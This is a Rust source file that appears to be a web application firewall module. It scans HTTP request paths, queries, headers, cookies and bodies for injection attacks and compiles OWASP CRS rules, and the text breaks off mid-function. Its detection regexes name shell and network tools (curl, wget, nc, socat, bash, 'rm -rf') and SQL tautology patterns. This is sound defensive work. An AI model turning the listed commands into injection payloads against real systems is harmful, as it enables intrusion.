use std::borrow::Cow;
use std::collections::HashSet;
use std::sync::OnceLock;

use exposure_core::config::{WafCategory, WafConfig, WafMode};
use exposure_core::crs::{
    builtin_crs_snapshot, WafRuleDescriptor, CRS_REGEX_SIZE_LIMIT, MAX_CRS_RULES,
};
use http::{header, HeaderMap, Method};
use regex::{Regex, RegexBuilder};
use sigil_filter::{AttackDetector, CategoryMask, DetectionResult, ScanInput, ViolationCategory};

/// Hard ceiling on request body bytes buffered for WAF inspection (prevents OOM DoS).
pub const WAF_HARD_MAX_BODY_BYTES: usize = 256 * 1024;
/// Header/URI buffer length thresholds (high enough for JWT cookies/long query strings,
/// while still catching NOP sleds, format strings, repeated padding, and oversized floods).
const HEAD_OVERFLOW_WARN_LEN: usize = 4096;
const HEAD_OVERFLOW_CRIT_LEN: usize = 8192;
/// Iteration caps preventing CPU-amplification DoS via thousands of tiny query/cookie/form items.
const MAX_WAF_QUERY_PARAMS: usize = 128;
const MAX_WAF_COOKIE_ITEMS: usize = 64;
const MAX_WAF_FORM_PARAMS: usize = 256;

#[derive(Debug, Clone)]
pub struct WafFinding {
    pub category: &'static str,
    pub location: &'static str,
    pub confidence: f32,
    pub reasons: Vec<&'static str>,
    /// Bounded snippet (<= 512 chars) of the matched input, used by `evilpot` deception/analysis.
    pub matched_payload: Option<String>,
    /// Optional matched OWASP CRS rule ID (e.g. `942140`), `None` for `sigil-filter` heuristic hits.
    pub rule_id: Option<u32>,
    /// Optional human-readable OWASP CRS rule message.
    pub rule_msg: Option<String>,
}

impl WafFinding {
    pub fn telemetry_reason(&self) -> String {
        if let Some(id) = self.rule_id {
            format!("waf:crs:{}:{}:{}", id, self.category, self.location)
        } else {
            format!("waf:{}:{}", self.category, self.location)
        }
    }
}

#[derive(Debug, Clone)]
pub enum WafVerdict {
    Allow,
    Monitor(WafFinding),
    Block(WafFinding),
    Evilpot(WafFinding),
}

impl WafVerdict {
    pub fn is_block(&self) -> bool {
        matches!(self, WafVerdict::Block(_))
    }

    pub fn is_evilpot(&self) -> bool {
        matches!(self, WafVerdict::Evilpot(_))
    }
}

pub fn category_to_sigil(cat: WafCategory) -> ViolationCategory {
    match cat {
        WafCategory::SqlInjection => ViolationCategory::SqlInjection,
        WafCategory::Xss => ViolationCategory::Xss,
        WafCategory::PathTraversal => ViolationCategory::PathTraversal,
        WafCategory::CommandInjection => ViolationCategory::CommandInjection,
        WafCategory::NoSqlInjection => ViolationCategory::NoSqlInjection,
        WafCategory::Ssrf => ViolationCategory::Ssrf,
        WafCategory::Ssti => ViolationCategory::SstiAndCodeInjection,
        WafCategory::Xxe => ViolationCategory::XxeAndXmlInjection,
        WafCategory::LdapInjection => ViolationCategory::LdapInjection,
        WafCategory::CrlfInjection => ViolationCategory::CrlfAndHeaderInjection,
        WafCategory::Deserialization => ViolationCategory::DeserializationAndPrototypePollution,
        WafCategory::BufferOverflow => ViolationCategory::BufferOverflow,
    }
}

pub fn sigil_category_label(cat: ViolationCategory) -> &'static str {
    match cat {
        ViolationCategory::BufferOverflow => "buffer-overflow",
        ViolationCategory::PathTraversal => "path-traversal",
        ViolationCategory::SqlInjection => "sql-injection",
        ViolationCategory::NoSqlInjection => "nosql-injection",
        ViolationCategory::Xss => "xss",
        ViolationCategory::CommandInjection => "command-injection",
        ViolationCategory::LdapInjection => "ldap-injection",
        ViolationCategory::XxeAndXmlInjection => "xxe",
        ViolationCategory::SstiAndCodeInjection => "ssti",
        ViolationCategory::Ssrf => "ssrf",
        ViolationCategory::CrlfAndHeaderInjection => "crlf-injection",
        ViolationCategory::DeserializationAndPrototypePollution => "deserialization",
        ViolationCategory::Custom(name) => name,
    }
}

fn sigil_rule_id_to_category(id: u32) -> Option<ViolationCategory> {
    match id {
        100001 => Some(ViolationCategory::SqlInjection),
        100002 => Some(ViolationCategory::Xss),
        100003 => Some(ViolationCategory::PathTraversal),
        100004 => Some(ViolationCategory::CommandInjection),
        100005 => Some(ViolationCategory::NoSqlInjection),
        100006 => Some(ViolationCategory::Ssrf),
        100007 => Some(ViolationCategory::SstiAndCodeInjection),
        100008 => Some(ViolationCategory::XxeAndXmlInjection),
        100009 => Some(ViolationCategory::LdapInjection),
        100010 => Some(ViolationCategory::CrlfAndHeaderInjection),
        100011 => Some(ViolationCategory::DeserializationAndPrototypePollution),
        100012 => Some(ViolationCategory::BufferOverflow),
        _ => None,
    }
}

fn build_category_mask(categories: &[WafCategory], disabled_rule_ids: &[u32]) -> CategoryMask {
    let mut mask = if categories.is_empty() {
        CategoryMask::ALL.0
    } else {
        let mut m = 0u16;
        for &c in categories {
            m |= category_to_sigil(c).bit();
        }
        m
    };
    for &id in disabled_rule_ids {
        if let Some(cat) = sigil_rule_id_to_category(id) {
            mask &= !cat.bit();
        }
    }
    CategoryMask(mask)
}

#[inline]
fn mask_without(mask: CategoryMask, excluded: ViolationCategory) -> CategoryMask {
    CategoryMask(mask.0 & !excluded.bit())
}

/// Checks whether a request path is exempt from WAF inspection.
/// Prefix matching respects `/` segment boundaries unless the exempt prefix itself ends with `/`.
pub fn is_path_exempt(path: &str, exempt_paths: &[String]) -> bool {
    for raw in exempt_paths {
        let p = raw.trim();
        if p.is_empty() {
            continue;
        }
        if p == "/" {
            return true;
        }
        if p.ends_with('/') {
            if path.starts_with(p) {
                return true;
            }
        } else if path == p || path.starts_with(&format!("{p}/")) {
            return true;
        }
    }
    false
}

/// Returns `Some(max_body_bytes)` when the request body should be buffered & inspected by WAF.
/// Binary/multipart uploads and WebSocket upgrades are intentionally skipped to preserve streaming.
pub fn should_inspect_body(
    cfg: &WafConfig,
    method: &Method,
    headers: &HeaderMap,
    is_upgrade: bool,
) -> Option<usize> {
    if cfg.mode == WafMode::Off || !cfg.inspect_body || is_upgrade {
        return None;
    }
    if !matches!(*method, Method::POST | Method::PUT | Method::PATCH) {
        return None;
    }
    let limit = cfg.max_body_bytes.min(WAF_HARD_MAX_BODY_BYTES);
    if limit == 0 {
        return None;
    }
    // Skip clearly non-textual binary/multipart payloads (images, files, gRPC, octet-stream)
    if let Some(ct) = headers
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
    {
        if !is_text_inspectable_content_type(ct) {
            return None;
        }
    }
    Some(limit)
}

fn is_text_inspectable_content_type(ct: &str) -> bool {
    let media = ct
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    if media.is_empty() {
        return true;
    }
    media.starts_with("text/")
        || media == "application/json"
        || media.ends_with("+json")
        || media == "application/x-www-form-urlencoded"
        || media == "application/xml"
        || media.ends_with("+xml")
        || media == "application/graphql"
        || media == "application/javascript"
        || media == "application/ecmascript"
}

const MAX_CAPTURED_PAYLOAD_CHARS: usize = 512;

#[inline]
fn verdict_from_result(
    mode: WafMode,
    location: &'static str,
    sample: &str,
    res: DetectionResult,
) -> Option<WafVerdict> {
    let cat = res.violation?;
    let reasons = res
        .violations
        .first()
        .map(|v| v.reasons.clone())
        .unwrap_or_default();
    let matched_payload = if sample.is_empty() {
        None
    } else {
        Some(sample.chars().take(MAX_CAPTURED_PAYLOAD_CHARS).collect())
    };
    let finding = WafFinding {
        category: sigil_category_label(cat),
        location,
        confidence: res.confidence,
        reasons,
        matched_payload,
        rule_id: None,
        rule_msg: None,
    };
    Some(match mode {
        WafMode::Off => WafVerdict::Allow,
        WafMode::Monitor => WafVerdict::Monitor(finding),
        WafMode::Block => WafVerdict::Block(finding),
        WafMode::Evilpot => WafVerdict::Evilpot(finding),
    })
}

#[inline]
fn replace_plus_with_space(s: &str) -> Cow<'_, str> {
    if s.as_bytes().contains(&b'+') {
        Cow::Owned(s.replace('+', " "))
    } else {
        Cow::Borrowed(s)
    }
}

fn hex_nibble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

fn percent_decode_lossy(input: &str) -> Cow<'_, str> {
    let bytes = input.as_bytes();
    if !bytes.contains(&b'%') && !bytes.contains(&b'+') {
        return Cow::Borrowed(input);
    }
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'+' {
            out.push(b' ');
            i += 1;
        } else if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_nibble(bytes[i + 1]), hex_nibble(bytes[i + 2])) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
            out.push(bytes[i]);
            i += 1;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    Cow::Owned(String::from_utf8_lossy(&out).into_owned())
}

fn sqli_tautology_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(
            r#"(?i)(?:(?:^|[\s'"()0-9])(?:or|and)\s+(?:[0-9]+\s*(?:=|!=|<>|<|>|<=|>=)\s*[0-9]+|'[^']{0,32}'\s*(?:=|!=|<>)\s*'[^']{0,32}'|"[^"]{0,32}"\s*(?:=|!=|<>)\s*"[^"]{0,32}")|(?:['")]|\b\d+)\s+(?:or|and)\s+(?:true|false)\b|'\s*(?:--|#|/\*)|\border\s+by\s+\d+\s*(?:--|#|/\*|$))"#,
        )
        .size_limit(CRS_REGEX_SIZE_LIMIT)
        .dfa_size_limit(CRS_REGEX_SIZE_LIMIT)
        .build()
        .expect("valid supplemental SQLi regex")
    })
}

fn cmdi_supplemental_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(
            r"(?i)(?:;|\|\|?|&&|\r|\n|\$\(\s*|\`\s*)(?:\$\{ifs\}|\$ifs\b|\s)*(?:/(?:usr/)?(?:local/)?(?:s?bin)/)?(?:sh|bash|dash|zsh|ash|ksh|csh|fish|busybox|cmd(?:\.exe)?|powershell|pwsh|cat|tac|nl|head|tail|ls|ll|dir|pwd|echo|printf|env|printenv|id|whoami|who|last|lastlog|groups|uname|hostname|hostnamectl|lsb_release|uptime|ps|htop|pgrep|netstat|ss|ip|ifconfig|route|iptables|ping|traceroute|nslookup|dig|curl|wget|fetch|tftp|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|python[23]?|perl|ruby|php|node|awk|sed|grep|egrep|fgrep|find|which|whereis|base64|xxd|tar|gzip|unzip|chmod|chown|rm\s+-rf|sudo|su|crontab|systemctl|service|docker|kubectl|nvidia-smi|sleep)\b",
        )
        .size_limit(CRS_REGEX_SIZE_LIMIT)
        .dfa_size_limit(CRS_REGEX_SIZE_LIMIT)
        .build()
        .expect("valid supplemental CMDi regex")
    })
}

fn supplemental_detect(
    cfg: &WafConfig,
    mask: CategoryMask,
    location: &'static str,
    sample: &str,
) -> Option<WafVerdict> {
    let decoded = percent_decode_lossy(sample);
    let s = clamp_utf8_bytes(decoded.as_ref(), MAX_CRS_SCAN_BYTES);
    if mask.contains(ViolationCategory::SqlInjection)
        && !cfg.disabled_rule_ids.contains(&942100)
        && sqli_tautology_regex().is_match(s)
    {
        let finding = WafFinding {
            category: "sql-injection",
            location,
            confidence: 0.90,
            reasons: vec!["sql-tautology-or-comment-injection"],
            matched_payload: Some(s.chars().take(MAX_CAPTURED_PAYLOAD_CHARS).collect()),
            rule_id: None,
            rule_msg: None,
        };
        return Some(match cfg.mode {
            WafMode::Off => WafVerdict::Allow,
            WafMode::Monitor => WafVerdict::Monitor(finding),
            WafMode::Block => WafVerdict::Block(finding),
            WafMode::Evilpot => WafVerdict::Evilpot(finding),
        });
    }
    if mask.contains(ViolationCategory::CommandInjection)
        && !cfg.disabled_rule_ids.contains(&932100)
        && cmdi_supplemental_regex().is_match(s)
    {
        let finding = WafFinding {
            category: "command-injection",
            location,
            confidence: 0.92,
            reasons: vec!["shell-separator-with-unix-command"],
            matched_payload: Some(s.chars().take(MAX_CAPTURED_PAYLOAD_CHARS).collect()),
            rule_id: None,
            rule_msg: None,
        };
        return Some(match cfg.mode {
            WafMode::Off => WafVerdict::Allow,
            WafMode::Monitor => WafVerdict::Monitor(finding),
            WafMode::Block => WafVerdict::Block(finding),
            WafMode::Evilpot => WafVerdict::Evilpot(finding),
        });
    }
    None
}

/// Inspect HTTP request head (URI path, query string, and selected request headers) using `sigil-filter`.
pub fn inspect_request_head(
    cfg: &WafConfig,
    path: &str,
    query: Option<&str>,
    headers: &HeaderMap,
) -> WafVerdict {
    if cfg.mode == WafMode::Off || is_path_exempt(path, &cfg.exempt_paths) {
        return WafVerdict::Allow;
    }

    let min_c = cfg.min_confidence.clamp(0.1, 1.0);
    let detector = AttackDetector::new()
        .with_min_confidence(min_c)
        .with_buffer_limits(HEAD_OVERFLOW_WARN_LEN, HEAD_OVERFLOW_CRIT_LEN);
    let mask = build_category_mask(&cfg.categories, &cfg.disabled_rule_ids);
    if mask.0 == 0 {
        return WafVerdict::Allow;
    }

    // 1. URI path
    if !path.is_empty() && path != "/" {
        let res = detector.detect(ScanInput::new(path).with_mask(mask));
        if let Some(v) = verdict_from_result(cfg.mode, "path", path, res) {
            return v;
        }
        if let Some(v) = supplemental_detect(cfg, mask, "path", path) {
            return v;
        }
    }

    // 2. Query string (scan bounded individual key/value pairs + raw query)
    if let Some(q) = query.filter(|q| !q.is_empty()) {
        for pair in q.split('&').take(MAX_WAF_QUERY_PARAMS) {
            if pair.is_empty() {
                continue;
            }
            let (k, v_opt) = match pair.split_once('=') {
                Some((k, v)) => (k, Some(v)),
                None => (pair, None),
            };
            let k_norm = replace_plus_with_space(k);
            let res = detector.detect(ScanInput::new(k_norm.as_ref()).with_mask(mask));
            if let Some(verdict) = verdict_from_result(cfg.mode, "query", k_norm.as_ref(), res) {
                return verdict;
            }
            if let Some(v) = v_opt.filter(|v| !v.is_empty()) {
                let v_norm = replace_plus_with_space(v);
                let res = detector.detect(ScanInput::new(v_norm.as_ref()).with_mask(mask));
                if let Some(verdict) = verdict_from_result(cfg.mode, "query", v_norm.as_ref(), res) {
                    return verdict;
                }
                if let Some(verdict) = supplemental_detect(cfg, mask, "query", v_norm.as_ref()) {
                    return verdict;
                }
            } else if let Some(verdict) = supplemental_detect(cfg, mask, "query", k_norm.as_ref()) {
                return verdict;
            }
            // Also scan the full `key=value` pair (catches MongoDB `user[$ne]=admin`, etc.)
            let pair_norm = replace_plus_with_space(pair);
            let res = detector.detect(ScanInput::new(pair_norm.as_ref()).with_mask(mask));
            if let Some(verdict) = verdict_from_result(cfg.mode, "query", pair_norm.as_ref(), res) {
                return verdict;
            }
        }
        // Catch cross-param/oversized query payloads
        let q_norm = replace_plus_with_space(q);
        let res = detector.detect(ScanInput::new(q_norm.as_ref()).with_mask(mask));
        if let Some(verdict) = verdict_from_result(cfg.mode, "query", q_norm.as_ref(), res) {
            return verdict;
        }
    }

    // 3. Selected HTTP headers (with HTTP-aware category masks to avoid false positives on benign browsers)
    if cfg.inspect_headers {
        // User-Agent: exclude PathTraversal because standard Windows browser UAs contain `/` + `Windows`
        let ua_mask = mask_without(mask, ViolationCategory::PathTraversal);
        for hv in headers.get_all(header::USER_AGENT) {
            if let Ok(s) = hv.to_str() {
                let res = detector.detect(ScanInput::new(s).with_mask(ua_mask));
                if let Some(v) = verdict_from_result(cfg.mode, "header:user-agent", s, res) {
                    return v;
                }
            }
        }

        // Referer: exclude Ssrf because browsing from localhost/127.0.0.1 sets `Referer: http://127.0.0.1/...`
        let referer_mask = mask_without(mask, ViolationCategory::Ssrf);
        for hv in headers.get_all(header::REFERER) {
            if let Ok(s) = hv.to_str() {
                let res = detector.detect(ScanInput::new(s).with_mask(referer_mask));
                if let Some(v) = verdict_from_result(cfg.mode, "header:referer", s, res) {
                    return v;
                }
            }
        }

        // Cookie: split on `;` (capped) so standard `a=1; id=2` cookie delimiters don't look like shell `; id` chains
        for hv in headers.get_all(header::COOKIE) {
            if let Ok(raw_cookie) = hv.to_str() {
                for item in raw_cookie.split(';').take(MAX_WAF_COOKIE_ITEMS) {
                    let trimmed = item.trim();
                    if trimmed.is_empty() {
                        continue;
                    }
                    let val = trimmed
                        .split_once('=')
                        .map(|(_, v)| v.trim())
                        .unwrap_or(trimmed);
                    if val.is_empty() {
                        continue;
                    }
                    let res = detector.detect(ScanInput::new(val).with_mask(mask));
                    if let Some(v) = verdict_from_result(cfg.mode, "header:cookie", val, res) {
                        return v;
                    }
                    if let Some(v) = supplemental_detect(cfg, mask, "header:cookie", val) {
                        return v;
                    }
                }
            }
        }

        // Proxy / rewrite headers frequently targeted by Log4Shell, SSRF, CRLF, or path-override attacks
        for (h_name, loc) in [
            ("x-original-url", "header:x-original-url"),
            ("x-rewrite-url", "header:x-rewrite-url"),
            ("x-forwarded-for", "header:x-forwarded-for"),
            ("x-forwarded-host", "header:x-forwarded-host"),
            ("forwarded", "header:forwarded"),
        ] {
            for hv in headers.get_all(h_name) {
                if let Ok(s) = hv.to_str() {
                    let res = detector.detect(ScanInput::new(s).with_mask(mask));
                    if let Some(v) = verdict_from_result(cfg.mode, loc, s, res) {
                        return v;
                    }
                    if let Some(v) = supplemental_detect(cfg, mask, loc, s) {
                        return v;
                    }
                }
            }
        }
    }

    WafVerdict::Allow
}

/// Inspect buffered HTTP request body bytes (`POST`/`PUT`/`PATCH`) using `sigil-filter`.
pub fn inspect_request_body(
    cfg: &WafConfig,
    content_type: Option<&str>,
    body: &[u8],
) -> WafVerdict {
    if cfg.mode == WafMode::Off || !cfg.inspect_body || body.is_empty() {
        return WafVerdict::Allow;
    }

    let limit = cfg.max_body_bytes.min(WAF_HARD_MAX_BODY_BYTES);
    if limit == 0 {
        return WafVerdict::Allow;
    }
    let slice = &body[..body.len().min(limit)];
    let text = match std::str::from_utf8(slice) {
        Ok(s) => s,
        Err(e) => {
            // If truncated mid-UTF8 codepoint at `limit`, inspect the valid prefix
            let valid = e.valid_up_to();
            if valid == 0 {
                return WafVerdict::Allow;
            }
            match std::str::from_utf8(&slice[..valid]) {
                Ok(s) => s,
                Err(_) => return WafVerdict::Allow,
            }
        }
    };

    let min_c = cfg.min_confidence.clamp(0.1, 1.0);
    // Raise length-only overflow thresholds above `limit` so benign JSON/form payloads within
    // `max_body_bytes` do not trip length warnings, while NOP sleds, format strings, and huge
    // repeated byte runs are still caught.
    let body_warn = limit.saturating_add(1).max(HEAD_OVERFLOW_WARN_LEN);
    let body_crit = body_warn.saturating_add(1);
    let detector = AttackDetector::new()
        .with_min_confidence(min_c)
        .with_buffer_limits(body_warn, body_crit);
    let mask = build_category_mask(&cfg.categories, &cfg.disabled_rule_ids);
    if mask.0 == 0 {
        return WafVerdict::Allow;
    }

    let is_form = content_type
        .map(|ct| {
            ct.split(';')
                .next()
                .unwrap_or("")
                .trim()
                .eq_ignore_ascii_case("application/x-www-form-urlencoded")
        })
        .unwrap_or(false);

    if is_form {
        for pair in text.split('&').take(MAX_WAF_FORM_PARAMS) {
            if pair.is_empty() {
                continue;
            }
            let pair_norm = replace_plus_with_space(pair);
            let res = detector.detect(ScanInput::new(pair_norm.as_ref()).with_mask(mask));
            if let Some(v) = verdict_from_result(cfg.mode, "body", pair_norm.as_ref(), res) {
                return v;
            }
            if let Some((_, val)) = pair.split_once('=') {
                if !val.is_empty() {
                    let val_norm = replace_plus_with_space(val);
                    let res = detector.detect(ScanInput::new(val_norm.as_ref()).with_mask(mask));
                    if let Some(v) = verdict_from_result(cfg.mode, "body", val_norm.as_ref(), res) {
                        return v;
                    }
                    if let Some(v) = supplemental_detect(cfg, mask, "body", val_norm.as_ref()) {
                        return v;
                    }
                }
            } else if let Some(v) = supplemental_detect(cfg, mask, "body", pair_norm.as_ref()) {
                return v;
            }
        }
        return WafVerdict::Allow;
    }

    let res = detector.detect(ScanInput::new(text).with_mask(mask));
    if let Some(v) = verdict_from_result(cfg.mode, "body", text, res) {
        return v;
    }
    supplemental_detect(cfg, mask, "body", text).unwrap_or(WafVerdict::Allow)
}

/* ==================== Compiled OWASP CRS Runtime Engine ==================== */

const MAX_CRS_SCAN_BYTES: usize = 8192;

#[derive(Debug, Clone, Copy)]
struct CrsTargetFlags {
    uri: bool,
    args: bool,
    body: bool,
    cookies: bool,
    all_headers: bool,
    user_agent: bool,
    referer: bool,
}

impl CrsTargetFlags {
    fn from_targets(targets: &[String]) -> Self {
        let mut f = Self {
            uri: false,
            args: false,
            body: false,
            cookies: false,
            all_headers: false,
            user_agent: false,
            referer: false,
        };
        for t in targets {
            let u = t.to_ascii_uppercase();
            match u.as_str() {
                "REQUEST_URI" | "REQUEST_URI_RAW" | "REQUEST_FILENAME" | "REQUEST_BASENAME" | "REQUEST_LINE" => {
                    f.uri = true;
                }
                "ARGS" | "ARGS_NAMES" | "ARGS_GET" | "ARGS_POST" | "QUERY_STRING" => {
                    f.args = true;
                }
                "REQUEST_BODY" => {
                    f.body = true;
                }
                "REQUEST_COOKIES" | "REQUEST_COOKIES_NAMES" => {
                    f.cookies = true;
                }
                "REQUEST_HEADERS" => {
                    f.all_headers = true;
                }
                "REQUEST_HEADERS:USER-AGENT" => {
                    f.user_agent = true;
                }
                "REQUEST_HEADERS:REFERER" => {
                    f.referer = true;
                }
                _ if u.starts_with("REQUEST_HEADERS:") => {
                    f.all_headers = true;
                }
                _ => {}
            }
        }
        f
    }
}

enum CompiledCrsMatcher {
    Regex(Regex),
    PhraseMatch(Vec<String>),
    Contains(String),
    BeginsWith(String),
    EndsWith(String),
}

impl CompiledCrsMatcher {
    fn is_match(&self, text: &str) -> bool {
        let slice = clamp_utf8_bytes(text, MAX_CRS_SCAN_BYTES);
        match self {
            Self::Regex(re) => re.is_match(slice),
            Self::PhraseMatch(phrases) => {
                let lower = slice.to_ascii_lowercase();
                phrases.iter().any(|p| lower.contains(p.as_str()))
            }
            Self::Contains(needle) => slice.to_ascii_lowercase().contains(needle.as_str()),
            Self::BeginsWith(prefix) => slice.to_ascii_lowercase().starts_with(prefix.as_str()),
            Self::EndsWith(suffix) => slice.to_ascii_lowercase().ends_with(suffix.as_str()),
        }
    }
}

fn clamp_utf8_bytes(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

fn crs_category_static(cat: &str) -> &'static str {
    match cat {
        "sql-injection" => "sql-injection",
        "xss" => "xss",
        "path-traversal" => "path-traversal",
        "command-injection" => "command-injection",
        "nosql-injection" => "nosql-injection",
        "ssrf" => "ssrf",
        "ssti" => "ssti",
        "xxe" => "xxe",
        "ldap-injection" => "ldap-injection",
        "crlf-injection" => "crlf-injection",
        "deserialization" => "deserialization",
        "buffer-overflow" => "buffer-overflow",
        "scanner-detection" => "scanner",
        "php-attack" => "php-attack",
        "protocol-attack" | "protocol-enforcement" => "protocol-attack",
        _ => "crs-rule",
    }
}

struct CompiledCrsRule {
    id: u32,
    paranoia_level: u8,
    category: &'static str,
    msg: String,
    targets: CrsTargetFlags,
    matcher: CompiledCrsMatcher,
}

/// Linear-time, ReDoS-safe compiled OWASP CRS rule engine shared across Ingress workers.
pub struct CompiledCrsEngine {
    rules: Vec<CompiledCrsRule>,
}

impl CompiledCrsEngine {
    /// Compile rules from `descriptors` (falls back to built-in CRS baseline if empty).
    pub fn compile(descriptors: &[WafRuleDescriptor], global_disabled: &[u32]) -> Self {
        let fallback;
        let list = if descriptors.is_empty() {
            fallback = builtin_crs_snapshot().rules;
            &fallback[..]
        } else {
            descriptors
        };
        let disabled: HashSet<u32> = global_disabled.iter().copied().collect();
        let mut compiled = Vec::new();
        for d in list.iter().take(MAX_CRS_RULES) {
            if !d.enabled || disabled.contains(&d.id) || d.source == "sigil-filter" {
                continue;
            }
            let matcher = match d.operator.as_str() {
                "rx" => match RegexBuilder::new(&d.pattern)
                    .size_limit(CRS_REGEX_SIZE_LIMIT)
                    .dfa_size_limit(CRS_REGEX_SIZE_LIMIT)
                    .build()
                {
                    Ok(re) => CompiledCrsMatcher::Regex(re),
                    Err(_) => continue,
                },
                "pm" => {
                    let phrases: Vec<String> = d
                        .pattern
                        .split_whitespace()
                        .map(|s| s.to_ascii_lowercase())
                        .filter(|s| !s.is_empty())
                        .collect();
                    if phrases.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::PhraseMatch(phrases)
                }
                "contains" => {
                    let n = d.pattern.to_ascii_lowercase();
                    if n.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::Contains(n)
                }
                "beginsWith" => {
                    let n = d.pattern.to_ascii_lowercase();
                    if n.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::BeginsWith(n)
                }
                "endsWith" => {
                    let n = d.pattern.to_ascii_lowercase();
                    if n.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::EndsWith(n)
                }
                _ => continue,
            };
            compiled.push(CompiledCrsRule {
                id: d.id,
                paranoia_level: d.paranoia_level.clamp(1, 4),
                category: crs_category_static(&d.category),
                msg: d.msg.clone(),
                targets: CrsTargetFlags::from_targets(&d.targets),
                matcher,
            });
        }
        Self { rules: compiled }
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    fn make_verdict(
        mode: WafMode,
        rule: &CompiledCrsRule,
        location: &'static str,
        sample: &str,
    ) -> WafVerdict {
        let finding = WafFinding {
            category: rule.category,
            location,
            confidence: 0.95,
            reasons: vec!["owasp-crs-rule"],
            matched_payload: if sample.is_empty() {
                None
            } else {
                Some(sample.chars().take(MAX_CAPTURED_PAYLOAD_CHARS).collect())
            },
            rule_id: Some(rule.id),
            rule_msg: Some(rule.msg.clone()),
        };
        match mode {
            WafMode::Off => WafVerdict::Allow,
            WafMode::Monitor => WafVerdict::Monitor(finding),
            WafMode::Block => WafVerdict::Block(finding),
            WafMode::Evilpot => WafVerdict::Evilpot(finding),
        }
    }

    pub fn inspect_head(
        &self,
        cfg: &WafConfig,
        path: &str,
        query: Option<&str>,
        headers: &HeaderMap,
    ) -> WafVerdict {
        if cfg.mode == WafMode::Off
            || !cfg.crs_enabled
            || is_path_exempt(path, &cfg.exempt_paths)
            || self.rules.is_empty()
        {
            return WafVerdict::Allow;
        }
        let max_pl = cfg.crs_paranoia_level.clamp(1, 4);
        let decoded_path = percent_decode_lossy(path);
        let decoded_query = query.filter(|q| !q.is_empty()).map(percent_decode_lossy);
        let query_vals: Vec<Cow<'_, str>> = query
            .filter(|q| !q.is_empty())
            .map(|q| {
                q.split('&')
                    .take(MAX_WAF_QUERY_PARAMS)
                    .filter_map(|p| p.split_once('=').map(|(_, v)| v).or(Some(p)))
                    .filter(|v| !v.is_empty())
                    .map(percent_decode_lossy)
                    .collect()
            })
            .unwrap_or_default();
        let ua = headers
            .get(header::USER_AGENT)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("");
        let referer = headers
            .get(header::REFERER)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("");
        let cookie_vals: Vec<Cow<'_, str>> = headers
            .get(header::COOKIE)
            .and_then(|v| v.to_str().ok())
            .map(|raw| {
                raw.split(';')
                    .take(MAX_WAF_COOKIE_ITEMS)
                    .filter_map(|item| {
                        let t = item.trim();
                        if t.is_empty() {
                            return None;
                        }
                        let v = t.split_once('=').map(|(_, v)| v.trim()).unwrap_or(t);
                        if v.is_empty() {
                            None
                        } else {
                            Some(percent_decode_lossy(v))
                        }
                    })
                    .collect()
            })
            .unwrap_or_default();

        for rule in &self.rules {
            if rule.paranoia_level > max_pl || cfg.disabled_rule_ids.contains(&rule.id) {
                continue;
            }
            if rule.targets.uri
                && !path.is_empty()
                && path != "/"
                && (rule.matcher.is_match(path) || rule.matcher.is_match(decoded_path.as_ref()))
            {
                return Self::make_verdict(cfg.mode, rule, "path", decoded_path.as_ref());
            }
            if rule.targets.args {
                for val in &query_vals {
                    if rule.matcher.is_match(val.as_ref()) {
                        return Self::make_verdict(cfg.mode, rule, "query", val.as_ref());
                    }
                }
                if let Some(ref dq) = decoded_query {
                    if rule.matcher.is_match(dq.as_ref()) {
                        return Self::make_verdict(cfg.mode, rule, "query", dq.as_ref());
                    }
                }
            }
            if cfg.inspect_headers {
                if (rule.targets.user_agent || rule.targets.all_headers)
                    && !ua.is_empty()
                    && rule.matcher.is_match(ua)
                {
                    return Self::make_verdict(cfg.mode, rule, "header:user-agent", ua);
                }
                if (rule.targets.referer || rule.targets.all_headers)
                    && !referer.is_empty()
                    && rule.matcher.is_match(referer)
                {
                    return Self::make_verdict(cfg.mode, rule, "header:referer", referer);
                }
                if rule.targets.cookies {
                    for cv in &cookie_vals {
                        if rule.matcher.is_match(cv.as_ref()) {
                            return Self::make_verdict(cfg.mode, rule, "header:cookie", cv.as_ref());
                        }
                    }
                }
                if rule.targets.all_headers {
                    for (h_name, loc) in [
                        ("x-original-url", "header:x-original-url"),
                        ("x-rewrite-url", "header:x-rewrite-url"),
                        ("x-forwarded-for", "header:x-forwarded-for"),
                        ("x-forwarded-host", "header:x-forwarded-host"),
                        ("forwarded", "header:forwarded"),
                    ] {
                        for hv in headers.get_all(h_name) {
                            if let Ok(s) = hv.to_str() {
                                if rule.matcher.is_match(s) {
                                    return Self::make_verdict(cfg.mode, rule, loc, s);
                                }
                            }
                        }
                    }
                }
            }
        }
        WafVerdict::Allow
    }

    pub fn inspect_body(&self, cfg: &WafConfig, body: &[u8]) -> WafVerdict {
        if cfg.mode == WafMode::Off
            || !cfg.crs_enabled
            || !cfg.inspect_body
            || body.is_empty()
            || self.rules.is_empty()
        {
            return WafVerdict::Allow;
        }
        let slice = &body[..body.len().min(MAX_CRS_SCAN_BYTES)];
        let text = match std::str::from_utf8(slice) {
            Ok(s) => s,
            Err(e) => match std::str::from_utf8(&slice[..e.valid_up_to()]) {
                Ok(s) if !s.is_empty() => s,
